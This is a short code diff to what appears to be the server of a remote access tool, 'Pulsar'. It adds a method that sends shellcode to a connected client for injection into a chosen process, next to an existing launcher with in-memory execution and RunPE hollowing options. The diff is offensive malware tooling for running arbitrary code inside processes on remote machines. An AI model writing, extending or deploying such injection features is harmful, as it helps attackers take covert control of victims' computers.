@@ -64,7 +64,21 @@ namespace Pulsar.Server.Messages
         }
 
         #region Remote Process Operations
+        public void InjectShellcode(int processId, byte[] shellcode)
+        {
+            if (shellcode == null || shellcode.Length == 0)
+            {
+                MessageBox.Show("Shellcode cannot be empty.", "Invalid Shellcode",
+                    MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
 
+            _client.Send(new DoInjectShellcodeIntoProcess
+            {
+                ProcessId = processId,
+                Shellcode = shellcode
+            });
+        }
         public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false, bool useRunPE = false, string runPETarget = "a", string runPECustomPath = null)
         {
             if (!File.Exists(remotePath))
